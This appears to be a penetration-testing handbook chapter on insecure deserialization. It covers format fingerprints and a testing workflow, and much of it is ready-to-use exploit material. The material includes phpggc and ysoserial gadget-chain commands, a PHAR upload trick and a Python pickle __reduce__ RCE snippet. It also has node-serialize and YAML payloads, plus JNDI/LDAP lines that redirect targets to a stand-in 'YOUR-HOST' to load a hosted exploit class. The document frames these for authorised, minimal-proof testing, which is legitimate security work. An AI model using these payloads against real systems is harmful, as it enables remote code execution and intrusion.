# Ch10 — Insecure Deserialization

> Format fingerprints, language-specific payload/tooling families (Java, PHP, Python, Ruby, .NET, Node), gadget-chain workflow.
> Sources: `Insecure Deserialization/` (README, PHP.md, Java.md, .NET notes, Python/Ruby/Node sections).

**Route here when**: a cookie/parameter/body contains a serialized object — magic bytes or Base64 signatures below — and the server `unserialize`s/`loads`/`readObject`s it.

**Safety**: gadget chains end in a command — point them at `id`, `nslookup YOUR-CALLBACK`, or `ping`. No shells, no writes.

## Fingerprint table

| Marker | Format |
|---|---|
| `rO0` (Base64) / `AC ED` hex | Java serialization (`ObjectInputStream`) |
| `O:`, `a:`, `s:`, `i:`, `b:`, `4F 3A` | PHP `serialize()` |
| `gASV` (Base64) / `80 04 95` | Python `pickle` |
| `BAgK` (Base64) / `04 08` | Ruby `Marshal.dump` |
| `AAEAAAD` (Base64) | .NET `BinaryFormatter` |
| `/w` + `FF 01` | .NET `ViewState` |
| `{"@type":...}`, `"py/object":` | Jackson polymorphic / jsonpickle |
| `!<tag:yaml.org,...>` / `!!python/object` | YAML loaders (SnakeYAML, PyYAML, ruby `YAML.load`) |
| `__proto__`, `{"rce":"_$$ND_FUNC$$_..."}` | JS object injection / node-serialize |

## PHP `unserialize()`

Serialized shapes: `O:<len>:"<class>":<n>:{props}`, `a:n:{...}`, `s:len:"..."`, `i:n`, `b:0/1`, `N;`.

**Object injection**: craft an object of an existing class whose magic methods do work — `__wakeup()` (on unserialize), `__destruct()` (on GC), `__toString()`, `__call()`, `__invoke()`:

```php
O:8:"Example":1:{s:8:"property";s:8:"value";}
```

**Gadget chains** — don't hand-write; use **phpggc** (PHP Generic Gadget Chains):

```bash
phpggc -l                                  # list chains (Guzzle, Laravel, Monolog, Symfony, SwiftMailer, Doctrine, WordPress…)
phpggc Guzzle/RCE1 system id               # serialize payload for a known gadget
phpggc -b Laravel/RCE4 system 'id'         # base64 output for cookie transport
```

Pick the chain by fingerprinting the framework (headers, error pages, composer.lock, vendor dir names).

**PHAR deserialization**: any `phar://path/to/archive` passed to a filesystem function (`file_exists`, `is_dir`, `file_get_contents`, `md5_file`, …) triggers `unserialize()` on the phar's **metadata** — no `unserialize()` call needed:

```php
$phar = new Phar('x.phar');
$phar->startBuffering();
$phar->addFromString('f.txt','x');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata(['obj'=> new GadgetChain()]);   // phpggc -o file
$phar->stopBuffering();
```

Rename `.phar`→`.jpg`, upload anywhere reachable, then hit it via `phar://uploads/x.jpg/x` through an FS call. `phar.readonly=0` to generate.

**Type juggling + unserialize**: `unserialize()` on a `__wakeup` that loose-compares, magic-hash tricks (see ch15 type-juggling).

## Java

Signatures: `AC ED 00 05` raw, `rO0` Base64, `{"@type":"com.x.Y"}` Jackson.

**Tooling**:

```bash
java -jar ysoserial.jar CommonsCollections1 'id' | base64     # classic chain — pick per classpath
java -jar ysoserial.jar -l                                   # list gadget chains
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer 'http://YOUR-HOST/#Evil'  # JNDI redirect
```

Gadget selection needs the target's classpath (CommonsCollections, Spring, Hibernate, Groovy, Jdk-only `JRMPClient`/`URLDNS` for blind detection). `URLDNS` gadget = pure-JDK DNS callback — the standard **blind probe**:

```bash
java -jar ysoserial.jar URLDNS 'http://YOUR-CALLBACK/'
```

**Jackson polymorphic**: `{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://YOUR-HOST/a","autoCommit":true}` — JNDI injection variant.

**SnakeYAML**: `!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://YOUR-HOST/"]]]]` — gadget via constructor args.

**JNDI/RMI**: when input reaches `InitialContext.lookup()` → point at your `marshalsec` LDAP/RMI server which redirects to a hosted exploit class.

## Python

**pickle**: `loads`/`load`/`cPickle` — RCE via `__reduce__`:

```python
import pickle, base64, os
class Evil:
    def __reduce__(self):
        return (os.system, ('id',))
print(base64.b64encode(pickle.dumps(Evil())))   # → gASV... blob to send
```

Blind variant: `return (os.system, ('nslookup YOUR-CALLBACK',))`. Use protocol 0/2 unless target needs 4+ (`80 04 95` header = proto4).

**PyYAML**: `yaml.load` w/o SafeLoader → `!!python/object/new:os.system ["id"]` or `!!python/object/apply:subprocess.Popen [["id"]]`; older PyYAML `!python/object` too. `yaml.safe_load` is the fix — presence of `!!python/*` tags = finding.

**jsonpickle**: `{"py/reduce":[{"py/function":"os.system"},{"py/tuple":["id"]}]}`.

## Ruby

`Marshal.load` on `BAgK`/`\x04\x08` blobs — gadget chains exist (baal_/jackson9 universal chains): ERB→`instance_eval` or `code_run` gadgets ending in `system('id')`. YAML: `YAML.load` with `!ruby/object:ERB`/`!ruby/object:OpenStruct` gadget chains (older rubys: `--- !ruby/object:Gem::Installer` …).

## .NET

`AAEAAAD`/`FF 01` ViewState markers → **ysoserial.net**:

```powershell
ysoserial.exe -l                                # list formatters+gadgets
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc" -o base64
ysoserial.exe -f Json.Net -g ObjectDataProvider -c "cmd /c whoami" -o raw
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "id" --path="/default.aspx" --apppath="/"
```

Formatters: `BinaryFormatter`, `SoapFormatter`, `NetDataContractSerializer`, `LosFormatter`/`ObjectStateFormatter` (ViewState), `Json.Net` (`$type`), `XmlSerializer`, `DataContractSerializer`, `YamlDotNet`. ViewState needs MAC keys — grab from web.config/`machineKey` leaks or try `--decryptionKey`/`--validationKey` when known.

## Node.js

**node-serialize**: `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(e,o){})}()"}`. **funcster**: `{"name":"__$$FUNCTION$$__..."}`.

## Workflow

1. **Fingerprint** the format (table above) + the framework (headers, cookies, error pages, `composer.lock`/`package.json`/`.csproj` leaks).
2. **Blind probe first**: URLDNS (Java), `nslookup`-command gadget (pickle/phpggc), `ping` — proves deserialization without touching exec paths.
3. **Gadget hunt**: phpggc/ysoserial/ysoserial.net chain matching installed libs; version mismatch → different chain.
4. **Transport**: match the channel encoding — Base64 cookie, JSON string, form field, raw body — and re-check signatures/MAC (ViewState MAC, JWT-signed blobs, Rails `secret_key_base`-signed session cookies — a leaked key lets you forge+serialize).
5. **Prove minimal**: `id`/DNS hit over RCE; document the reachable gadget path.
